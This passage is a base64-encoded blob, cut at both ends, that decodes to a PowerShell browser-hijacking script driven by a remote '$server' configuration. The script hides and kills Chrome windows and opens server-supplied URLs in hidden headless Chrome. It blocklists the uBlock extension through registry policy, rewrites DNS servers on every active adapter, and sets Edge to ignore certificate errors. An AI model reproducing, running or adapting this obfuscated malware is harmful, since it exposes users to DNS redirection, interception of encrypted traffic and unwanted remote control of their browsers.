1Zpc2libGVFeChJbnRQdHIgaFduZCkgew0KICAgICAgICAgICAgcmV0dXJuIElzV2luZG93VmlzaWJsZShoV25kKSAmJiBHZXRXaW5kb3dUZXh0TGVuZ3RoKGhXbmQpID4gMDsNCiAgICAgICAgfQ0KDQogICAgICAgIHB1YmxpYyBzdGF0aWMgSW50UHRyW10gRW51bWVyYXRlQWxsV2luZG93cygpIHsNCiAgICAgICAgICAgIHZhciB3aW5kb3dIYW5kbGVzID0gbmV3IExpc3Q8SW50UHRyPigpOw0KICAgICAgICAgICAgRW51bVdpbmRvd3MoKGhXbmQsIGxQYXJhbSkgPT4gew0KICAgICAgICAgICAgICAgIGlmIChJc1dpbmRvd1Zpc2libGVFeChoV25kKSkgew0KICAgICAgICAgICAgICAgICAgICB3aW5kb3dIYW5kbGVzLkFkZChoV25kKTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgcmV0dXJuIHRydWU7DQogICAgICAgICAgICB9LCBJbnRQdHIuWmVybyk7DQogICAgICAgICAgICByZXR1cm4gd2luZG93SGFuZGxlcy5Ub0FycmF5KCk7DQogICAgICAgIH0NCg0KICAgICAgICBbRGxsSW1wb3J0KCJ1c2VyMzIuZGxsIiwgU2V0TGFzdEVycm9yID0gdHJ1ZSldDQogICAgICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIGJvb2wgU2hvd1dpbmRvdyhJbnRQdHIgaFduZCwgaW50IG5DbWRTaG93KTsNCg0KICAgICAgICBwdWJsaWMgY29uc3QgaW50IFNXX0hJREUgPSAwOw0KICAgICAgICBwdWJsaWMgY29uc3QgaW50IFNXX01JTklNSVpFID0gNjsNCiAgICAgICAgcHVibGljIGNvbnN0IGludCBTV19TSE9XID0gNTsNCg0KICAgICAgICBbRGxsSW1wb3J0KCJ1c2VyMzIuZGxsIiwgU2V0TGFzdEVycm9yID0gdHJ1ZSldDQogICAgICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIGJvb2wgUG9zdE1lc3NhZ2UoSW50UHRyIGhXbmQsIHVpbnQgTXNnLCBJbnRQdHIgd1BhcmFtLCBJbnRQdHIgbFBhcmFtKTsNCg0KICAgICAgICBwdWJsaWMgc3RhdGljIHZvaWQgQ2xvc2VXaW5kb3coSW50UHRyIGhXbmQpIHsNCiAgICAgICAgICAgIGNvbnN0IHVpbnQgV01fQ0xPU0UgPSAweDAwMTA7DQogICAgICAgICAgICBQb3N0TWVzc2FnZShoV25kLCBXTV9DTE9TRSwgSW50UHRyLlplcm8sIEludFB0ci5aZXJvKTsNCiAgICAgICAgfQ0KICAgIH0NCiJADQoNCiAgICBpZiAoSGF2ZVRvUHVzaGVzKQ0KICAgIHsNCiAgICAgICAgQ2xvc2UtQWxsQ2hyb21lczsNCiAgICAgICAgUmVtb3ZlLVB1c2hlczsNCiAgICAgICAgQWRkLVB1c2hlczsNCiAgICB9DQoNCn0NCmNhdGNoIHsNCiAgICB3cml0ZWRiZyAiQW4gZXJyb3Igb2NjdXJyZWQgKENvbmZpZ3VyZSBDaHJvbWUgUHVzaGVzKTogJF8iDQp9DQp9DQoNCg0KDQpmdW5jdGlvbiBPcGVuLUNocm9tZVdpdGhVcmwgew0KICAgIHBhcmFtICgNCiAgICAgICAgW3N0cmluZ10kdXJsLCAkaXNEZWJ1Zw0KICAgICkNCiAgICAkam9iID0gU3RhcnQtSm9iIC1TY3JpcHRCbG9jayB7DQogICAgICAgICAgICBwYXJhbSAoJHVybCwgJGlzRGVidWcpDQoNCiAgICAgICAgICAgIHRyeSB7DQogICAgICAgICAgICAgICAgDQogDQogICAgICAgICAgICBBZGQtVHlwZSBAIg0KICAgICAgICAgICAgdXNpbmcgU3lzdGVtOw0KICAgICAgICAgICAgdXNpbmcgU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWM7DQogICAgICAgICAgICB1c2luZyBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXM7DQogICAgICAgICAgICB1c2luZyBTeXN0ZW0uVGV4dDsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgcHVibGljIHN0YXRpYyBjbGFzcyBVc2VyMzJYIHsNCiAgICAgICAgICAgICAgICBwdWJsaWMgZGVsZWdhdGUgYm9vbCBFbnVtV2luZG93c1Byb2MoSW50UHRyIGhXbmQsIEludFB0ciBsUGFyYW0pOw0KICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgW0RsbEltcG9ydCgidXNlcjMyLmRsbCIsIFNldExhc3RFcnJvciA9IHRydWUpXQ0KICAgICAgICAgICAgICAgIHByaXZhdGUgc3RhdGljIGV4dGVybiBib29sIEVudW1XaW5kb3dzKEVudW1XaW5kb3dzUHJvYyBscEVudW1GdW5jLCBJbnRQdHIgbFBhcmFtKTsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIFtEbGxJbXBvcnQoInVzZXIzMi5kbGwiLCBTZXRMYXN0RXJyb3IgPSB0cnVlKV0NCiAgICAgICAgICAgICAgICBwcml2YXRlIHN0YXRpYyBleHRlcm4gaW50IEdldFdpbmRvd1RleHQoSW50UHRyIGhXbmQsIFN0cmluZ0J1aWxkZXIgbHBTdHJpbmcsIGludCBuTWF4Q291bnQpOw0KICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgW0RsbEltcG9ydCgidXNlcjMyLmRsbCIsIFNldExhc3RFcnJvciA9IHRydWUpXQ0KICAgICAgICAgICAgICAgIHByaXZhdGUgc3RhdGljIGV4dGVybiBpbnQgR2V0V2luZG93VGV4dExlbmd0aChJbnRQdHIgaFduZCk7DQogICAgICAgICAgICANCiAgICAgICAgICAgICAgICBbRGxsSW1wb3J0KCJ1c2VyMzIuZGxsIiwgU2V0TGFzdEVycm9yID0gdHJ1ZSldDQogICAgICAgICAgICAgICAgcHJpdmF0ZSBzdGF0aWMgZXh0ZXJuIGJvb2wgSXNXaW5kb3dWaXNpYmxlKEludFB0ciBoV25kKTsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIHB1YmxpYyBzdGF0aWMgc3RyaW5nIEdldFdpbmRvd1RleHQoSW50UHRyIGhXbmQpIHsNCiAgICAgICAgICAgICAgICAgICAgaW50IGxlbmd0aCA9IEdldFdpbmRvd1RleHRMZW5ndGgoaFduZCk7DQogICAgICAgICAgICAgICAgICAgIGlmIChsZW5ndGggPT0gMCkgcmV0dXJuIFN0cmluZy5FbXB0eTsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICBTdHJpbmdCdWlsZGVyIHNiID0gbmV3IFN0cmluZ0J1aWxkZXIobGVuZ3RoICsgMSk7DQogICAgICAgICAgICAgICAgICAgIEdldFdpbmRvd1RleHQoaFduZCwgc2IsIHNiLkNhcGFjaXR5KTsNCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIHNiLlRvU3RyaW5nKCk7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgcHVibGljIHN0YXRpYyBib29sIElzV2luZG93VmlzaWJsZUV4KEludFB0ciBoV25kKSB7DQogICAgICAgICAgICAgICAgICAgIHJldHVybiBJc1dpbmRvd1Zpc2libGUoaFduZCkgJiYgR2V0V2luZG93VGV4dExlbmd0aChoV25kKSA+IDA7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgcHVibGljIHN0YXRpYyBJbnRQdHJbXSBFbnVtZXJhdGVBbGxXaW5kb3dzKCkgew0KICAgICAgICAgICAgICAgICAgICB2YXIgd2luZG93SGFuZGxlcyA9IG5ldyBMaXN0PEludFB0cj4oKTsNCiAgICAgICAgICAgICAgICAgICAgRW51bVdpbmRvd3MoKGhXbmQsIGxQYXJhbSkgPT4gew0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgKElzV2luZG93VmlzaWJsZUV4KGhXbmQpKSB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgd2luZG93SGFuZGxlcy5BZGQoaFduZCk7DQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gdHJ1ZTsNCiAgICAgICAgICAgICAgICAgICAgfSwgSW50UHRyLlplcm8pOw0KICAgICAgICAgICAgICAgICAgICByZXR1cm4gd2luZG93SGFuZGxlcy5Ub0FycmF5KCk7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgW0RsbEltcG9ydCgidXNlcjMyLmRsbCIsIFNldExhc3RFcnJvciA9IHRydWUpXQ0KICAgICAgICAgICAgICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIGJvb2wgU2hvd1dpbmRvdyhJbnRQdHIgaFduZCwgaW50IG5DbWRTaG93KTsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIHB1YmxpYyBjb25zdCBpbnQgU1dfSElERSA9IDA7DQogICAgICAgICAgICAgICAgcHVibGljIGNvbnN0IGludCBTV19NSU5JTUlaRSA9IDY7DQogICAgICAgICAgICAgICAgcHVibGljIGNvbnN0IGludCBTV19TSE9XID0gNTsNCiAgICAgICAgICAgICAgICBwdWJsaWMgY29uc3QgaW50IFNXX01BWElNSVpFID0gMzsgLy8gQWRkZWQgY29uc3RhbnQgZm9yIG1heGltaXppbmcgd2luZG93DQogICAgICAgICAgICANCiAgICAgICAgICAgICAgICBbRGxsSW1wb3J0KCJ1c2VyMzIuZGxsIiwgU2V0TGFzdEVycm9yID0gdHJ1ZSldDQogICAgICAgICAgICAgICAgcHVibGljIHN0YXRpYyBleHRlcm4gYm9vbCBQb3N0TWVzc2FnZShJbnRQdHIgaFduZCwgdWludCBNc2csIEludFB0ciB3UGFyYW0sIEludFB0ciBsUGFyYW0pOw0KICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgcHVibGljIHN0YXRpYyB2b2lkIENsb3NlV2luZG93KEludFB0ciBoV25kKSB7DQogICAgICAgICAgICAgICAgICAgIGNvbnN0IHVpbnQgV01fQ0xPU0UgPSAweDAwMTA7DQogICAgICAgICAgICAgICAgICAgIFBvc3RNZXNzYWdlKGhXbmQsIFdNX0NMT1NFLCBJbnRQdHIuWmVybywgSW50UHRyLlplcm8pOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCiJADQp9DQpjYXRjaCB7DQp9DQogICAgICAgIA0KICAgICAgICBmdW5jdGlvbiBDbG9zZS1DaHJvbWVXaW5kb3cgew0KICAgICAgICAgICAgdHJ5IHsNCiAgICAgICAgICAgICAgICBwYXJhbSAoJHdpbmRvdykNCiAgICAgICAgICAgICAgICBbVXNlcjMyWF06OkNsb3NlV2luZG93KCR3aW5kb3cpIHwgT3V0LU51bGwNCiAgICAgICAgICAgICAgICBTdGFydC1TbGVlcCAtTWlsbGlzZWNvbmRzIDEwMA0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgY2F0Y2gge30NCiAgICAgICAgfQ0KICAgICAgICANCiAgICAgICAgZnVuY3Rpb24gQ2xvc2UtQ2hyb21lIHsNCiAgICAgICAgICAgIHBhcmFtICgkcHJvY2VzcykNCiAgICAgICAgICAgIENsb3NlLUNocm9tZVdpbmRvdyAtd2luZG93ICRwcm9jZXNzLk1haW5XaW5kb3dIYW5kbGUNCiAgICAgICAgICAgIHRyeSB7DQogICAgICAgICAgICAgICAgJHByb2Nlc3MgfCBTdG9wLVByb2Nlc3MgLUZvcmNlDQogICAgICAgICAgICB9DQogICAgICAgICAgICBjYXRjaCB7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCg0KICAgICAgICAkY2hyb21lUGF0aHMgPSBAKA0KICAgICAgICAgICAgIkM6XFByb2dyYW0gRmlsZXNcR29vZ2xlXENocm9tZVxBcHBsaWNhdGlvblxjaHJvbWUuZXhlIiwNCiAgICAgICAgICAgICJDOlxQcm9ncmFtIEZpbGVzICh4ODYpXEdvb2dsZVxDaHJvbWVcQXBwbGljYXRpb25cY2hyb21lLmV4ZSIsDQogICAgICAgICAgICAiJGVudjpMT0NBTEFQUERBVEFcR29vZ2xlXENocm9tZVxBcHBsaWNhdGlvblxjaHJvbWUuZXhlIiwNCiAgICAgICAgICAgICIkZW52OlByb2dyYW1GaWxlc1xHb29nbGVcQ2hyb21lXEFwcGxpY2F0aW9uXGNocm9tZS5leGUiLA0KICAgICAgICAgICAgIiRlbnY6UHJvZ3JhbUZpbGVzKHg4NilcR29vZ2xlXENocm9tZVxBcHBsaWNhdGlvblxjaHJvbWUuZXhlIg0KICAgICAgICApDQogICAgICAgICRyZXNvbHZlZFBhdGhzID0gQCgpDQogICAgICAgIGZvcmVhY2ggKCRwYXRoIGluICRjaHJvbWVQYXRocykgew0KICAgICAgICAgICAgdHJ5IHsNCiAgICAgICAgICAgICAgICAkcmVzb2x2ZWRQYXRoID0gUmVzb2x2ZS1QYXRoIC1QYXRoICRwYXRoIC1FcnJvckFjdGlvbiBTdG9wDQogICAgICAgICAgICAgICAgaWYgKCRyZXNvbHZlZFBhdGggLW5vdGluICRyZXNvbHZlZFBhdGhzKSB7DQogICAgICAgICAgICAgICAgICAgICRyZXNvbHZlZFBhdGhzICs9ICRyZXNvbHZlZFBhdGguUGF0aA0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0gY2F0Y2ggew0KICAgICAgICAgICAgICAgIHdyaXRlZGJnICJFcnJvciByZXNvbHZpbmcgcGF0aDogJF8iDQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICAgICAgJHJlc29sdmVkUGF0aHMgPSAkcmVzb2x2ZWRQYXRocyB8IFNlbGVjdC1PYmplY3QgLVVuaXF1ZQ0KICAgICAgICBmb3JlYWNoICgkcGF0aCBpbiAkcmVzb2x2ZWRQYXRocykgew0KICAgICAgICAgICAgaWYgKFRlc3QtUGF0aCAtUGF0aCAkcGF0aCkgew0KICAgICAgICAgICAgICAgIHdyaXRlZGJnICJGb3VuZCBDaHJvbWUgYXQ6ICRwYXRoIg0KICAgIA0KICAgICAgICAgICAgICAgICRwcm9jZXNzU3RhcnRJbmZvID0gTmV3LU9iamVjdCBTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2Vzc1N0YXJ0SW5mbw0KICAgICAgICAgICAgICAgICRwcm9jZXNzU3RhcnRJbmZvLkZpbGVOYW1lID0gJHBhdGgNCiAgICAgICAgICAgICAgICBpZiAoLW5vdCAkaXNEZWJ1ZykNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICRwcm9jZXNzU3RhcnRJbmZvLkFyZ3VtZW50cyA9ICItLWhlYWRsZXNzIjsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgJHByb2Nlc3NTdGFydEluZm8uQXJndW1lbnRzICs9ICIgLS1kaXNhYmxlLWdwdSAtLWR1bXAtZG9tICR1cmwiDQogICAgICAgICAgICAgICAgJHByb2Nlc3NTdGFydEluZm8uQ3JlYXRlTm9XaW5kb3cgPSAkZmFsc2UNCiAgICAgICAgICAgICAgICAkcHJvY2Vzc1N0YXJ0SW5mby5Vc2VTaGVsbEV4ZWN1dGUgPSAkZmFsc2UNCiAgICAgICAgICAgICAgICAkcHJvY2VzcyA9IE5ldy1PYmplY3QgU3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MNCiAgICAgICAgICAgICAgICAkcHJvY2Vzcy5TdGFydEluZm8gPSAkcHJvY2Vzc1N0YXJ0SW5mbw0KICAgICAgICAgICAgICAgICRwcm9jZXNzLlN0YXJ0KCkgfCBPdXQtTnVsbCAgICAgICAgIA0KICAgICAgICAgICAgICAgICRlbmRUaW1lID0gKEdldC1EYXRlKS5BZGRTZWNvbmRzKDgpDQogICAgICAgICAgICAgICAgd2hpbGUgKChHZXQtRGF0ZSkgLWx0ICRlbmRUaW1lKSB7DQogICAgICAgICAgICAgICAgICAgIGlmICgkaXNEZWJ1ZyAtZXEgJGZhbHNlKQ0KICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICB0cnkNCiAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBbVXNlcjMyWF06OlNob3dXaW5kb3coJHByb2Nlc3MuTWFpbldpbmRvd0hhbmRsZSwgW1VzZXIzMlhdOjpTV19ISURFKSB8IE91dC1OdWxsICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgIGNhdGNoDQogICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgU3RhcnQtU2xlZXAgLU1pbGxpc2Vjb25kcyAxMDANCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgdHJ5DQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICBbVXNlcjMyWF06OlNob3dXaW5kb3coJHByb2Nlc3MuTWFpbldpbmRvd0hhbmRsZSwgW1VzZXIzMlhdOjpTV19TSE9XKSB8IE91dC1OdWxsDQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIGNhdGNoDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBDbG9zZS1DaHJvbWUgLXByb2Nlc3MgJHByb2Nlc3MNCiAgICAgICAgICAgICAgICBicmVhaw0KICAgICAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICAgICB3cml0ZWRiZyAiQ2hyb21lIG5vdCBmb3VuZCBhdDogJHBhdGgiDQogICAgICAgICAgICB9DQogICAgICAgIH0NCg0KICAgIH0gLUFyZ3VtZW50TGlzdCAkdXJsLCAkaXNEZWJ1Zw0KDQogICAgcmV0dXJuICRqb2INCn0NCg0KZnVuY3Rpb24gTGF1bmNoQ2hyb21lUHVzaGVzIHsNCiAgICAkYXV0byA9IFRlc3QtQXV0b3N0YXJ0Ow0KICAgIGlmICgkc2VydmVyLnB1c2hlc0ZvcmNlIC1uZSAkZmFsc2UgLWFuZCAkYXV0byAtZXEgJHRydWUpDQogICAgew0KICAgICAgICB3cml0ZWRiZyAiU2tpcHBpbmcgZnVuY3Rpb24gTGF1bmNoQ2hyb21lUHVzaGVzIg0KICAgICAgICByZXR1cm4NCiAgICB9DQogICAgdHJ5IHsNCiAgICAgICAgZm9yZWFjaCAoJHB1c2ggaW4gJHNlcnZlci5wdXNoZXMpIHsNCiAgICAgICAgICAgICRpc0RlYnVnID0gSXNEZWJ1Zw0KICAgICAgICAgICAgT3Blbi1DaHJvbWVXaXRoVXJsIC11cmwgJHB1c2ggLWlzRGVidWcgJGlzRGVidWcNCiAgICAgICAgfQ0KICAgIH0NCiAgICBjYXRjaCB7DQogICAgICB3cml0ZWRiZyAiQW4gZXJyb3Igb2NjdXJyZWQgTGF1bmNoQ2hyb21lUHVzaGVzKTogJF8iDQogICAgfQ0KfQ0KDQpmdW5jdGlvbiBkb19jaHJvbWVfcHVzaCB7DQogICAgQ29uZmlndXJlQ2hyb21lUHVzaGVzDQogICAgTGF1bmNoQ2hyb21lUHVzaGVzDQp9DQoNCmZ1bmN0aW9uIGRvX2Nocm9tZV91YmxvY2sgew0KICAgICRrZXl3b3JkcyA9IEAoInVCbG9jayIpDQoNCiAgICBmb3JlYWNoICgkZGlyIGluIEdldC1FbnZQYXRocykgew0KICAgICAgICAkY2hyb21lRGlyID0gSm9pbi1QYXRoIC1QYXRoICRkaXIgLUNoaWxkUGF0aCAiR29vZ2xlXENocm9tZVxVc2VyIERhdGFcRGVmYXVsdFxFeHRlbnNpb25zIg0KICAgICAgICANCiAgICAgICAgdHJ5IHsNCiAgICAgICAgICAgIGlmIChUZXN0LVBhdGggLVBhdGggJGNocm9tZURpciAtUGF0aFR5cGUgQ29udGFpbmVyKSB7DQogICAgICAgICAgICAgICAgJGV4dGVuc2lvbnMgPSBHZXQtQ2hpbGRJdGVtIC1QYXRoICRjaHJvbWVEaXIgLURpcmVjdG9yeQ0KDQogICAgICAgICAgICAgICAgZm9yZWFjaCAoJGV4dGVuc2lvbiBpbiAkZXh0ZW5zaW9ucykgew0KICAgICAgICAgICAgICAgICAgICAkbWFuRmlsZSA9IGNocm9tZXVibG9ja19GaW5kTWFuaWZlc3RGaWxlIC1mb2xkZXIgJGV4dGVuc2lvbi5GdWxsTmFtZQ0KICAgICAgICAgICAgICAgICAgICBpZiAoJG1hbkZpbGUgLW5lICIiKSB7DQogICAgICAgICAgICAgICAgICAgICAgICAkZm91bmRLZXl3b3JkID0gJGZhbHNlDQogICAgICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgICAgIGZvcmVhY2ggKCRtYW5pZmVzdFZhbHVlIGluICRrZXl3b3Jkcykgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRjb250ZW50ID0gR2V0LUNvbnRlbnQgLVBhdGggJG1hbkZpbGUgLVJhdw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkY29udGVudCAtbWF0Y2ggW3JlZ2V4XTo6RXNjYXBlKCRtYW5pZmVzdFZhbHVlKSkgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkZm91bmRLZXl3b3JkID0gJHRydWUNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICB9DQoNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkZm91bmRLZXl3b3JkKSB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJGV4dEZvbGRlck5hbWUgPSBbU3lzdGVtLklPLlBhdGhdOjpHZXRGaWxlTmFtZSgkZXh0ZW5zaW9uLkZ1bGxOYW1lKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNocm9tZXVibG9ja19Qcm9jZXNzTWFuaWZlc3RBbGwgLWV4dE5hbWUgJGV4dEZvbGRlck5hbWUNCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgfSBjYXRjaCB7DQogICAgICAgICAgICAgd3JpdGVkYmcgIkVycm9yIG9jY3VycmVkOiAkXyINCiAgICAgICAgfQ0KICAgIH0NCn0NCg0KDQpmdW5jdGlvbiBjaHJvbWV1YmxvY2tfRmluZE1hbmlmZXN0RmlsZSB7DQogICAgcGFyYW0gKA0KICAgICAgICBbc3RyaW5nXSRmb2xkZXINCiAgICApDQoNCiAgICAkcmVzdWx0ID0gIiINCg0KICAgIEdldC1DaGlsZEl0ZW0gLVBhdGggJGZvbGRlciB8IEZvckVhY2gtT2JqZWN0IHsNCiAgICAgICAgaWYgKC1ub3QgKCRfLlBTSXNDb250YWluZXIpKSB7DQogICAgICAgICAgICBpZiAoJF8uTmFtZSAtZXEgIm1hbmlmZXN0Lmpzb24iKSB7DQogICAgICAgICAgICAgICAgJHJlc3VsdCA9ICRfLkZ1bGxOYW1lDQogICAgICAgICAgICAgICAgcmV0dXJuDQogICAgICAgICAgICB9DQogICAgICAgIH0gZWxzZWlmICgkXy5OYW1lIC1ub3RpbiBAKCcuJywgJy4uJykpIHsNCiAgICAgICAgICAgICRyZXN1bHQgPSBjaHJvbWV1YmxvY2tfRmluZE1hbmlmZXN0RmlsZSAtZm9sZGVyICRfLkZ1bGxOYW1lDQogICAgICAgICAgICBpZiAoJHJlc3VsdCAtbmUgIiIpIHsNCiAgICAgICAgICAgICAgICByZXR1cm4NCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgIH0NCg0KICAgIHJldHVybiAkcmVzdWx0DQp9DQoNCg0KZnVuY3Rpb24gY2hyb21ldWJsb2NrX1Byb2Nlc3NNYW5pZmVzdEFsbCB7DQogICAgcGFyYW0gKA0KICAgICAgICBbc3RyaW5nXSRleHROYW1lDQogICAgKQ0KDQogICAgY2hyb21ldWJsb2NrX1Byb2Nlc3NNYW5pZmVzdCAtZXh0TmFtZSAkZXh0TmFtZSAtYnJvd3NlciAiR29vZ2xlXENocm9tZSINCn0NCg0KZnVuY3Rpb24gY2hyb21ldWJsb2NrX1Byb2Nlc3NNYW5pZmVzdCB7DQogICAgcGFyYW0gKA0KICAgICAgICBbc3RyaW5nXSRleHROYW1lLA0KICAgICAgICBbc3RyaW5nXSRicm93c2VyDQogICAgKQ0KDQogICAgJHJlZ1BhdGggPSAiSEtMTTpcU09GVFdBUkVcUG9saWNpZXNcJGJyb3dzZXJcRXh0ZW5zaW9uSW5zdGFsbEJsb2NrbGlzdCINCiAgICANCiAgICBpZiAoLW5vdCAoVGVzdC1QYXRoICRyZWdQYXRoKSkgew0KICAgICAgICBOZXctSXRlbSAtUGF0aCAkcmVnUGF0aCAtRm9yY2UgfCBPdXQtTnVsbA0KICAgIH0NCiAgICANCiAgICAkcmVnS2V5SW5kZXggPSAxDQogICAgZG8gew0KICAgICAgICAka2V5TmFtZSA9ICIkcmVnS2V5SW5kZXgiDQogICAgICAgICR2YWwgPSBHZXQtSXRlbVByb3BlcnR5IC1QYXRoICRyZWdQYXRoIC1OYW1lICRrZXlOYW1lIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlDQogICAgICAgIGlmICgkdmFsIC1lcSAkZXh0TmFtZSkgew0KICAgICAgICAgICAgcmV0dXJuDQogICAgICAgIH0NCiAgICAgICAgJHJlZ0tleUluZGV4KysNCiAgICB9IHVudGlsICgtbm90IChUZXN0LVBhdGggIiRyZWdQYXRoXCRrZXlOYW1lIikpDQoNCiAgICBTZXQtSXRlbVByb3BlcnR5IC1QYXRoICRyZWdQYXRoIC1OYW1lICRrZXlOYW1lIC1WYWx1ZSAkZXh0TmFtZQ0KfQ0KDQpmdW5jdGlvbiBTZXQtRG5zU2VydmVycyB7DQogICAgcGFyYW0gKA0KICAgICAgICBbc3RyaW5nXSRwcmltYXJ5RG5zU2VydmVyLA0KICAgICAgICBbc3RyaW5nXSRzZWNvbmRhcnlEbnNTZXJ2ZXINCiAgICApDQoNCiAgICB0cnkgew0KICAgICAgICAjIEdldCBuZXR3b3JrIGFkYXB0ZXJzIHRoYXQgYXJlIElQLWVuYWJsZWQNCiAgICAgICAgJG5ldHdvcmtBZGFwdGVycyA9IEdldC1OZXRBZGFwdGVyIHwgV2hlcmUtT2JqZWN0IHsgJF8uU3RhdHVzIC1lcSAnVXAnIC1hbmQgJF8uSW50ZXJmYWNlRGVzY3JpcHRpb24gLW5vdGxpa2UgJypWaXJ0dWFsKicgfQ0KDQogICAgICAgIGZvcmVhY2ggKCRhZGFwdGVyIGluICRuZXR3b3JrQWRhcHRlcnMpIHsNCiAgICAgICAgICAgICMgU2V0IEROUyBzZXJ2ZXJzIHVzaW5nIFNldC1EbnNDbGllbnRTZXJ2ZXJBZGRyZXNzIGNtZGxldA0KICAgICAgICAgICAgU2V0LURuc0NsaWVudFNlcnZlckFkZHJlc3MgLUludGVyZmFjZUFsaWFzICRhZGFwdGVyLk5hbWUgLVNlcnZlckFkZHJlc3NlcyBAKCRwcmltYXJ5RG5zU2VydmVyLCAkc2Vjb25kYXJ5RG5zU2VydmVyKSAtQ29uZmlybTokZmFsc2UNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgd3JpdGVkYmcgIlN1Y2Nlc3NmdWxseSBzZXQgRE5TIHNlcnZlcnMgZm9yIGFkYXB0ZXI6ICQoJGFkYXB0ZXIuSW50ZXJmYWNlRGVzY3JpcHRpb24pIg0KICAgICAgICB9DQogICAgfSBjYXRjaCB7DQogICAgICAgIHdyaXRlZGJnICJBbiBlcnJvciBvY2N1cnJlZDogJF8iDQogICAgfQ0KfQ0KDQpmdW5jdGlvbiBkb19kbnNtYW4gew0KICAgIFNldC1ETlNTZXJ2ZXJzIC1QcmltYXJ5RE5TU2VydmVyICRzZXJ2ZXIucHJpbWFyeURucyAtU2Vjb25kYXJ5RE5TU2VydmVyICRzZXJ2ZXIuc2Vjb25kYXJ5RG5zDQp9DQoNCmZ1bmN0aW9uIGRvX2VkZ2Ugew0KICAgICRwYXRocyA9IEAoDQogICAgICAgICJIS0xNOlxTT0ZUV0FSRVxQb2xpY2llc1xNaWNyb3NvZnRcRWRnZSIsDQogICAgICAgICJIS0NVOlxTT0ZUV0FSRVxQb2xpY2llc1xNaWNyb3NvZnRcRWRnZSINCiAgICApDQoNCiAgICBmb3JlYWNoICgkZWRnZUtleVBhdGggaW4gJHBhdGhzKSANCiAgICB7DQogICAgICAgIGlmICgtbm90IChUZXN0LVBhdGggJGVkZ2VLZXlQYXRoKSkgew0KICAgICAgICAgICAgTmV3LUl0ZW0gLVBhdGggJGVkZ2VLZXlQYXRoIC1Gb3JjZSB8IE91dC1OdWxsDQogICAgICAgIH0NCiAgICAgICAgDQogICAgICAgICRjb21tYW5kTGluZVBhdGggPSBKb2luLVBhdGggJGVkZ2VLZXlQYXRoICJDb21tYW5kTGluZSINCiAgICAgICAgaWYgKC1ub3QgKFRlc3QtUGF0aCAkY29tbWFuZExpbmVQYXRoKSkgew0KICAgICAgICAgICAgTmV3LUl0ZW0gLVBhdGggJGNvbW1hbmRMaW5lUGF0aCAtRm9yY2UgfCBPdXQtTnVsbA0KICAgICAgICB9DQogICAgICAgIA0KICAgICAgICBTZXQtSXRlbVByb3BlcnR5IC1QYXRoICRjb21tYW5kTGluZVBhdGggLU5hbWUgIihEZWZhdWx0KSIgLVZhbHVlICItLWlnbm9yZS1jZXJ0aWZpY2F0ZS1lcnJvcnMgLS1kaXNh